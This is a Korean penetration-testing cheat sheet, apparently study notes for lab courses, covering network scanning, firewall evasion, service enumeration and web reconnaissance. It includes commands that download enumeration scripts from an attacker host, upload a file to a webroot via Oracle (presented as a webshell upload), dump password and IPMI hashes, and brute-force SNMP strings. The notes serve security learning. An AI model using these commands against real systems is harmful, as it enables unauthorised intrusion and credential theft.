# Penetration Testing Cheat Sheet

## 🔍 Banner Grabbing

Banner grabbing은 서비스 버전 정보를 수집하여 잠재적 취약점을 식별하는 기술입니다.

### 기본 명령어

```bash
# Netcat을 이용한 배너 그래빙
nc -nv <ip> <port>

# HTTP 헤더 확인 (SSL 포함)
curl -IL https://www.inlanefreight.com

# 웹 기술 스택 파악
whatweb --no-errors 10.10.10.0/24
```

### 추가 정보 수집 위치

- **SSL Certificate**: HTTPS 사이트의 인증서 정보 확인
- **robots.txt**: `http://10.10.10.10/robots.txt` - 크롤링 제한 정보 및 숨겨진 경로 발견
- **JavaScript Source Code**: 프론트엔드 소스코드에서 API 엔드포인트, 주석 등 확인

---

## 📁 File Transfer

공격 대상 시스템으로 파일을 전송하는 다양한 방법입니다.

```bash
# wget을 이용한 다운로드
wget http://10.10.14.1:8000/linenum.sh

# curl을 이용한 다운로드 (출력 파일명 지정)
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

# SCP를 이용한 보안 전송
scp linenum.sh user@remotehost:/tmp/linenum.sh

# Base64 인코딩된 파일 디코딩
echo <base64 encoded file> | base64 -d > shell
```

> **Tip**: Base64 인코딩 방식은 바이너리 파일을 텍스트로 전송할 때 유용합니다.

---

## 🗺️ Nmap Scanning

### 호스트 발견 (Host Discovery)

```bash
# 파일 목록에서 호스트 스캔 (포트 스캔 없이)
sudo nmap -sn -oA tnet -iL ip.list

# ICMP Echo를 이용한 호스트 발견 (ARP 비활성화)
sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping
```

### 주요 옵션 설명

| 옵션 | 설명 |
|------|------|
| `-sn` | 포트 스캔 비활성화 (호스트 발견만 수행) |
| `-PE` | ICMP Echo 요청 사용 (ping 테스트) |
| `--disable-arp-ping` | ARP 핑 비활성화 (라우터 너머의 호스트 스캔 시 필요) |
| `-oA` | 모든 형식으로 결과 저장 (Normal, XML, Grepable) |
| `-iL` | 파일에서 타겟 목록 읽기 |

> **Note**: 라우터 너머에 있는 호스트는 ARP로 도달할 수 없으므로 ICMP 또는 TCP를 사용해야 합니다.

---

## 🔥 Firewall Evasion

방화벽 우회 기술을 통해 제한된 포트나 서비스에 접근합니다.

### DNS 포트를 이용한 우회

```bash
# UDP DNS 포트 스캔
sudo nmap -sV 10.129.22.22 -Pn -p53 -sU

# TCP DNS 포트 스캔
sudo nmap -sV 10.129.22.22 -Pn -p53

# 소스 포트를 53번으로 지정하여 스캔
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

# Netcat으로 연결 (소스 포트 53번 사용)
ncat -nv -p 53 10.129.2.28 50000
```

### 작동 원리

DNS는 TCP와 UDP 모두 53번 포트에서 작동하며, 쿼리 크기에 따라 프로토콜이 달라집니다:
- **UDP 53**: 일반적인 DNS 쿼리 (512 바이트 이하)
- **TCP 53**: 큰 응답이나 Zone Transfer

**우회 기법**: 자신의 53번 포트에서 패킷을 전송하면, 일부 방화벽은 DNS 트래픽으로 오인하여 통과시킬 수 있습니다.

---

## 🔎 Footprinting

### SSL Certificate 정보 수집
<img width="969" height="759" alt="image" src="https://github.com/user-attachments/assets/9b03c318-cce6-4810-ab5d-0c70a0648c2b" />

```bash
# crt.sh를 이용한 서브도메인 발견
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```

> **Tip**: SSL 인증서에는 서브도메인 정보가 포함되어 있어 공격 표면 확장에 유용합니다.

---

## 📡 FTP SSL Certificate

```bash
# FTP over SSL 연결
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

### 체크리스트
- ✅ Nmap 스캔 시 `AUTH TLS` 확인 → SSL 연결 지원
- ✅ `ls -al`로 숨김 파일 확인
- ✅ 파일 업로드 권한 테스트

---

## 🖥️ SMB & RPC Client

### RPC Client 명령어

```bash
# 익명 접속 (계정 없이)
rpcclient -U '' -N 10.129.23.91
```

### RPC Client 내부 명령어

```bash
# 도메인 정보 조회
querydominfo

# 모든 공유 폴더 나열
netshareenumall

# 특정 공유 폴더 정보
netsharegetinfo <share>

# 도메인 사용자 나열
enumdomusers

# 특정 사용자 정보 (RID로 조회)
queryuser <RID>
```

### 주요 명령어 설명

| 명령어 | 기능 |
|--------|------|
| `querydominfo` | 도메인, 서버, 사용자 정보 제공 |
| `netshareenumall` | 사용 가능한 모든 공유 폴더 열거 |
| `netsharegetinfo` | 특정 공유 폴더의 상세 정보 |
| `enumdomusers` | 모든 도메인 사용자 열거 |
| `queryuser` | 특정 사용자의 상세 정보 (RID 필요) |

---

## 📂 NFS (Network File System)

**포트**: 111 (rpcbind), 2049 (nfsd)

```bash
# 공유된 NFS 목록 확인
showmount -e <target>

# NFS 마운트
sudo mount -t nfs 10.129.14.128:/target ./target/ -o nolock

# 언마운트
sudo umount ./target
```

> **Security Note**: NFS는 기본적으로 인증이 약하므로, 민감한 데이터가 노출될 수 있습니다.

---

## 🌐 DNS Enumeration

### 기본 조회

```bash
# DNS 레코드 조회
dig inlanefreight.htb

# 역방향 DNS 조회 (IP → 도메인)
dig -x <ip>

# 특정 DNS 서버에서 NS 레코드 조회
dig ns inlanefreight.htb @10.129.14.128

# DNS 서버 버전 확인
dig CH TXT version.bind @10.129.120.85

# 모든 레코드 조회
dig any inlanefreight.htb @10.129.14.128
```

### Zone Transfer (AXFR)

Zone Transfer는 DNS 서버 간 전체 Zone 데이터를 복사하는 기능으로, 잘못 설정된 경우 모든 도메인 정보가 노출됩니다.

```bash
# Zone Transfer 시도
dig axfr <domain> @<dns server>

# 테스트용 Zone Transfer (의도적으로 허용된 서버)
dig axfr @nsztm1.digi.ninja zonetransfer.me

# 실제 타겟에서 시도
dig axfr inlanefreight.htb @10.129.14.128
```

### DNS 브루트포싱

```bash
# dnsenum을 이용한 서브도메인 발견
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r

# 특정 DNS 서버 지정
dnsenum --dnsserver 10.129.167.221 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt inlanefreight.htb
```

### DNS 용어 설명

- **ZONE**: DNS 데이터베이스의 특정 부분 (도서관의 각 섹션에 해당)
- **CNAME**: Canonical Name, 도메인의 별칭 레코드

---

## 🌍 Virtual Host (VHOST) Discovery

가상 호스트는 하나의 IP에서 여러 도메인을 호스팅하는 기술입니다.

### Gobuster 사용

```bash
# 기본 VHOST 발견
gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain

# 포트 지정 예시
gobuster vhost -u http://94.237.120.112:44025 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain --domain inlanefreight.htb
```

### FFUF 사용

```bash
# FFUF로 VHOST 브루트포스
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.inlanefreight.htb' -u http://83.136.253.132:32685
```

> **Important**: 80번 포트가 아닌 경우, VHOST에도 포트를 명시해야 합니다 (예: `http://example.com:8443`)

---

## 📧 SMTP Enumeration

**포트**: 25 (SMTP), 465 (SMTPS), 587 (Submission)

```bash
# SMTP 사용자 열거
smtp-user-enum -M VRFY -U footprinting-wordlist.txt -t 10.129.42.195 -w 20 -v
```

### 옵션 설명
- `-M VRFY`: VRFY 명령어 사용 (사용자 존재 확인)
- `-U`: 사용자명 워드리스트
- `-t`: 타겟 IP
- `-w 20`: 타임아웃 20초 (일부 SMTP 서버는 응답이 느림)
- `-v`: Verbose 모드

> **Note**: 일부 SMTP 서버는 응답 시간이 길 수 있으므로 타임아웃을 충분히 설정하세요.

---

## 📬 IMAP & POP3

### SSL 연결

```bash
# POP3S 연결
openssl s_client -connect 10.129.14.128:pop3s

# IMAPS 연결
openssl s_client -connect 10.129.14.128:imaps
```

### IMAP 명령어 (Telnet)

```bash
# IMAP 연결
telnet <ip> 143

# 로그인
a LOGIN <id> <password>

# 메일박스 목록
a LIST "" *

# 메일박스 선택 (대소문자 구분!)
a SELECT INBOX

# 모든 메일 검색
a SEARCH ALL

# 메일 헤더 확인
a fetch <NUMBER> body[header]

# 메일 본문 확인
a fetch <NUMBER> body[text]

# 로그아웃
a LOGOUT
```

> **Warning**: 메일박스 이름은 대소문자를 구분합니다. `INBOX`와 `inbox`는 다릅니다.

---

## 🔐 SNMP (Simple Network Management Protocol)

**포트**: 161 (UDP)

### 기본 쿼리

```bash
# SNMP Walk (단일 OID 조회)
snmpwalk -v2c -c public 10.129.14.128

# SNMP Bulk Walk (대량 데이터 수집)
snmpbulkwalk -c public -v2c 10.10.10.10 . > result

# Community String 지정
snmpbulkwalk -c <community_string> -v2c <ip> . > result
```

### Community String 찾기

Community String은 SNMP의 "비밀번호" 역할을 합니다.

```bash
# Community String 브루트포스
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

> - `snmpbulkwalk`는 SNMP v2c부터 사용 가능
> - 타임아웃 발생 시 다른 community string 시도

---

## 🗄️ MSSQL (Microsoft SQL Server)

**포트**: 1433

### 기본 데이터베이스

MSSQL 설치 시 기본으로 생성되는 데이터베이스:

| 데이터베이스 | 용도 |
|-------------|------|
| `master` | 시스템 설정 및 메타데이터 |
| `model` | 새 데이터베이스의 템플릿 |
| `msdb` | SQL Server Agent, 백업, 작업 정보 |
| `tempdb` | 임시 데이터 저장 |
| `resource` | 시스템 객체 (숨김) |

---

## 🏛️ Oracle TNS (Transparent Network Substrate)

**포트**: 1521

### ODAT 도구 사용

```bash
# 모든 Oracle 취약점 테스트
sudo odat.py all -s 10.129.204.235

# Oracle Instant Client 라이브러리 설정
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

### SQLPlus 연결

```bash
# 일반 사용자로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid>

# SYSDBA 권한으로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid> as sysdba
```

### 파일 업로드 (웹쉘)

```bash
# utlfile을 이용한 파일 업로드
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

### 유용한 SQL 쿼리

```sql
-- 모든 테이블 조회
SELECT table_name FROM all_tables;

-- 현재 사용자의 권한 확인
SELECT * FROM user_role_privs;

-- 사용자 계정 및 해시 조회
SELECT name, password FROM sys.user$;
```

---

## 🖧 IPMI (Intelligent Platform Management Interface)

**포트**: 623 (UDP)

IPMI는 원격 서버 관리를 위한 인터페이스로, 취약한 설정 시 해시 덤프가 가능합니다.

### Nmap 스크립트

```bash
# IPMI 버전 확인
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit 모듈

```bash
# IPMI 버전 확인
use auxiliary/scanner/ipmi/ipmi_version

# IPMI 해시 덤프
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

---

## 🖥️ RDP (Remote Desktop Protocol)

**포트**: 3389

### 체크리스트

침투 테스트 시 RDP 접근 후 확인할 사항:

- ✅ 특정 프로그램을 관리자 권한으로 실행 가능한지 확인
- ✅ `cmd.exe` 또는 `powershell.exe`를 관리자로 실행 가능한지 테스트

---

## 📊 Information Gathering - Web

### 디렉토리 차이점

```
/admin  → 리다이렉션 (301/302)
/admin/ → /admin/index 파일 직접 반환 (200)
```

> **Tip**: 슬래시 유무에 따라 서버 응답이 다를 수 있습니다.

---

## 🔍 WHOIS 조회

```bash
# 도메인 등록 정보 확인
whois <domain>
```

WHOIS 정보에서 얻을 수 있는 데이터:
- 등록자 정보
- 네임서버
- 등록일/만료일
- 연락처 정보

---

## 🎯 Web Fingerprinting

웹 서버와 애플리케이션의 기술 스택을 파악하는 기술입니다.

### 기법

1. **Banner Grabbing**: 서버 응답 헤더 분석
2. **HTTP Headers 분석**: 사용 기술 파악
3. **Specific Responses 프로빙**: 특정 요청에 대한 응답 패턴 분석
4. **Page Content 분석**: HTML, JavaScript 분석

### 실전 명령어

```bash
# HTTP 헤더 확인 (비SSL)
curl -I inlanefreight.com

# HTTPS 헤더 확인
curl -I https://inlanefreight.com

# www 서브도메인 헤더 확인
curl -I https://www.inlanefreight.com
```

### 방화벽 탐지

```bash
# WAF 탐지
wafw00f inlanefreight.com

# Nikto로 취약점 스캔 (소프트웨어 식별에 중점)
nikto -h inlanefreight.com -Tuning b
```

---

## 🔗 Well-Known URIs

RFC 8615에 정의된 표준화된 경로로, 웹사이트의 메타데이터를 제공합니다.

```bash
# 보안 정책 및 취약점 제보 정보
https://example.com/.well-known/security.txt

# 비밀번호 변경 페이지
https://example.com/.well-known/change-password

# OpenID Connect 설정
https://example.com/.well-known/openid-configuration
```

> **Use Case**: `security.txt`를 통해 버그 바운티 프로그램이나 보안 연락처를 찾을 수 있습니다.

---

## 🕷️ Web Crawlers

웹사이트 구조를 자동으로 탐색하여 숨겨진 페이지나 경로를 발견합니다.

### Scrapy 설치 및 사용

```bash
# Scrapy 설치
pip3 install scrapy

# ReconSpider 실행
python3 ReconSpider.py http://dev.web1337.inlanefreight.htb:41954
```

---

## 🕰️ Wayback Machine

Internet Archive의 Wayback Machine을 통해 과거 웹사이트 스냅샷을 확인할 수 있습니다.

**URL**: https://web.archive.org/

### 활용 방법
- 삭제된 페이지 확인
- 과거 코드나 설정 파일 발견
- 도메인 소유권 변경 이력 추적

---

## 🔧 FinalRecon

> **⚠️ OSCP 시험에서 사용 불가**

통합 정보 수집 도구입니다.

```bash
# 헤더 및 WHOIS 정보 수집
./finalrecon.py --headers --whois --url http://inlanefreight.com
```
---
